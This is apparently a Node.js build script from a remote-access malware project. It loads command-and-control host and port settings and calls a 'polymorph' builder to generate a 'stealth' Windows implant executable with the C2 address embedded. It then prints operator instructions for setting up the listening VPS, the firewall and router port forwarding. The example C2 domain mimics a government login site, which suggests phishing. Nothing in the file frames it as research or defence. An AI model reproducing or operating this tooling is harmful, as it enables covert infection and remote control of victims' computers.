#!/usr/bin/env node
/**
 * Build Windows stealth EXE using .env.production C2 settings (must match VPS TCP_PORT).
 */
const path = require('path');
const fs = require('fs');
const dotenv = require('dotenv');

const root = path.join(__dirname, '..');
const prodEnv = path.join(root, '.env.production');
const fallback = path.join(root, '.env');

if (fs.existsSync(prodEnv)) {
  dotenv.config({ path: prodEnv, override: true });
} else if (fs.existsSync(fallback)) {
  dotenv.config({ path: fallback, override: true });
}

function resolveListenPort() {
  const httpPort = Number(process.env.PORT || 5000);
  let tcp = Number(process.env.TCP_PORT || process.env.BUILD_C2_PORT || 2026);
  if (tcp === httpPort) tcp = 2026;
  return tcp;
}

const host = String(process.env.BUILD_C2_HOST || process.env.PUBLIC_C2_HOST || '').trim();
const port = resolveListenPort();

if (!host) {
  console.error('Set BUILD_C2_HOST in .env.production (e.g. milauth-mygovin.serveftp.com)');
  process.exit(1);
}

process.env.APP_ENV = 'production';

const { generateBuild } = require('../builder/polymorph');

generateBuild({
  platform: 'windows',
  arch: 'amd64',
  variant: 'implant',
  host,
  port,
})
  .then((m) => {
    console.log('\n=== Production stealth EXE ready ===');
    console.log('C2 (embedded):', m.host + ':' + m.port);
    console.log('File:', m.latestStealthExe || path.join(root, 'builds', 'working', 'latest-stealth.exe'));
    console.log('SHA256:', m.sha256);
    console.log('VPS must show: [TCP] Server listening on 0.0.0.0:' + m.port);
    console.log('Firewall + router: forward TCP', m.port, 'to this server');
  })
  .catch((e) => {
    console.error('Build failed:', e.message);
    process.exit(1);
  });
